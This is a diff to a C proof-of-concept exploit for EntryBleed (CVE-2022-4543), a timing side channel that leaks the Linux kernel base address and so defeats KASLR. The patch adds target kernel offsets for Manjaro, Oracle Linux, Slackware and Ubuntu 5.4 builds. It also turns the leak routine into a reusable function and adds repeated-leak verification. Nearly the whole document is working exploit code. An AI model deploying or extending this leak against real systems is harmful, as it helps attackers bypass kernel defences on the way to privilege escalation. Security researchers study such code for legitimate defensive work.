@@ -36,8 +36,6 @@
 #include <sys/utsname.h>
 #include <unistd.h>
 
-int kernel = -1;
-
 struct kernel_info {
   const char *kernel_version;
   uint64_t entry_syscall_64;
@@ -88,14 +86,14 @@ struct kernel_info offsets[] = {
     // Manjaro
     {"4.19.23-1-MANJARO #1 SMP PREEMPT Fri Feb 15 21:27:33 UTC 2019",                              0xa00000, 0xe00000},
     {"5.2.11-1-MANJARO #1 SMP PREEMPT Thu Aug 29 07:41:24 UTC 2019",                               0xa00000, 0xe00000},
+    {"5.4.18-1-MANJARO #1 SMP PREEMPT Thu Feb 6 11:41:30 UTC 2020",                                0xa00000, 0xe00000},
 
-    /* EntryBleed for Ubuntu 5.4.0-x kernels works on Intel but produces unreliable results on AMD
+    // NOTE: EntryBleed for Ubuntu 5.4.0-x kernels works on Intel but produces unreliable results on AMD
     {"5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020",                               0xc00000, 0x1000000},
     {"5.4.0-65-generic #73~18.04.1-Ubuntu SMP Tue Jan 19 09:02:24 UTC 2021",                       0xc00000, 0x1000000},
     {"5.4.0-77-generic #86~18.04.1-Ubuntu SMP Fri Jun 18 01:23:22 UTC 2021",                       0xc00000, 0x1000000},
     {"5.4.0-89-generic #100~18.04.1-Ubuntu SMP Wed Sep 29 10:59:42 UTC 2021",                      0xc00000, 0x1000000},
     {"5.4.0-135-generic #152~18.04.2-Ubuntu SMP Tue Nov 29 08:23:49 UTC 2022",                     0xc00000, 0x1000000},
-    */
 
     // Ubuntu 18.04
     {"4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019",                              0xa00000, 0xe00000},
@@ -191,7 +189,11 @@ struct kernel_info offsets[] = {
     {"5.14.21-150400.24.38-default #1 SMP PREEMPT_DYNAMIC Fri Dec 9 09:29:22 UTC 2022 (e9c5676)",  0xc00000, 0x1000000},
 
     // Oracle Linux
+    {"4.18.0-147.el8.x86_64 #1 SMP Tue Nov 12 11:05:49 PST 2019",                                  0xa00000, 0xe00000},
     {"5.14.0-162.6.1.el9_1.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov 15 15:13:28 PST 2022",            0xc00000, 0x1000000},
+
+    // Slackware 15
+    {"5.15.80 #1 SMP PREEMPT Sun Nov 27 13:28:05 CST 2022",                                        0xc00000, 0x1000000},
 
     // Linux Mint
     {"4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018",                              0xa00000, 0xe00000},
@@ -215,7 +217,7 @@ struct utsname get_kernel_version() {
 #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
 #define KERNEL_VERSION_SIZE_BUFFER 512
 
-void detect_kernel_version() {
+int detect_kernel_version() {
   struct utsname u;
   char kernel_version[KERNEL_VERSION_SIZE_BUFFER];
 
@@ -233,13 +235,12 @@ void detect_kernel_version() {
   for (i = 0; i < ARRAY_SIZE(offsets); i++) {
     if (strcmp(kernel_version, offsets[i].kernel_version) == 0) {
       printf("[.] kernel version '%s' detected\n", offsets[i].kernel_version);
-      kernel = i;
-      return;
+      return i;
     }
   }
 
   printf("[-] kernel version '%s' not recognized\n", kernel_version);
-  exit(1);
+  return -1;
 }
 
 bool detect_cpu_pti_flag() {
@@ -313,15 +314,16 @@ uint64_t sidechannel(uint64_t addr) {
 #define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP
 
 uint64_t leak_syscall_entry(uint64_t offset) {
-  int iterations = 100;
-  int dummy_iterations = 5;
   uint64_t data[ARR_SIZE] = {0};
   uint64_t min = ~0, addr = ~0;
-
   uint64_t SCAN_START = KERNEL_BASE_MIN + offset;
 
-  for (int i = 0; i < iterations + dummy_iterations; i++) {
-    for (uint64_t idx = 0; idx < ARR_SIZE; idx++) {
+  int iterations = 100;
+  int dummy_iterations = 5;
+  int i;
+  uint64_t idx;
+  for (i = 0; i < iterations + dummy_iterations; i++) {
+    for (idx = 0; idx < ARR_SIZE; idx++) {
       uint64_t test = SCAN_START + idx * STEP;
       syscall(104);
       uint64_t time = sidechannel(test);
@@ -330,7 +332,7 @@ uint64_t leak_syscall_entry(uint64_t offset) {
     }
   }
 
-  for (int i = 0; i < ARR_SIZE; i++) {
+  for (i = 0; i < ARR_SIZE; i++) {
     data[i] /= iterations;
     if (data[i] < min) {
       min = data[i];
@@ -345,14 +347,12 @@ uint64_t leak_syscall_entry(uint64_t offset) {
   return 0;
 }
 
-int main(int argc, char **argv) {
-  printf("[.] trying EntryBleed (CVE-2022-4543) ...\n");
-
+unsigned long get_kernel_addr_entrybleed() {
   int cpu = detect_cpu_vendor();
 
   if (cpu == 0) {
     printf("[-] Unknown CPU vendor\n");
-    exit(1);
+    return 0;
   }
 
   int pti = detect_cpu_pti_flag();
@@ -363,19 +363,41 @@ int main(int argc, char **argv) {
   if (cpu == 1 && pti == 1) {
     printf(
         "[-] AMD systems with KPTI enabled are not affected by EntryBleed\n");
-    exit(1);
+    return 0;
   }
 
-  detect_kernel_version();
+  int kernel = detect_kernel_version();
+
+  if (kernel == -1)
+    return 0;
 
   uint64_t offset = offsets[kernel].start_rodata;
   if (pti)
     offset = offsets[kernel].entry_syscall_64;
 
+  // Verify with several attempts
   unsigned long addr = leak_syscall_entry(offset);
+  int iterations = 3;
+  int i;
+  for (i = 0; i < iterations; i++) {
+    if (addr != leak_syscall_entry(offset)) {
+      addr = 0;
+      printf("[-] Inconsistent results. Aborting ...\n");
+      break;
+    }
+  }
+
+  return addr;
+}
+
+int main(int argc, char **argv) {
+  printf("[.] trying EntryBleed (CVE-2022-4543) ...\n");
+
+  unsigned long addr = get_kernel_addr_entrybleed();
   if (!addr)
     return 1;
 
   printf("possible kernel base: %lx\n", addr);
+
   return 0;
 }
